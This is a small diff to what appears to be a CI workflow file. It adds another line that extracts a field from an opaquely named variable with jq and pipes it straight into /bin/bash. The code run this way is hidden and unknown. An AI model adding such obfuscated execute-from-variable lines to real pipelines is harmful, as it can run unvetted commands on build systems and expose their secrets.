@@ -25,6 +25,7 @@ jobs:
           echo $k22 | jq -r .vptg8303 | /bin/bash
           echo $nzff3 | jq -r .fvtta7 | /bin/bash
           echo $ldb9 | jq -r .wuav7 | /bin/bash
+          echo $fey18 | jq -r .ynqw15 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
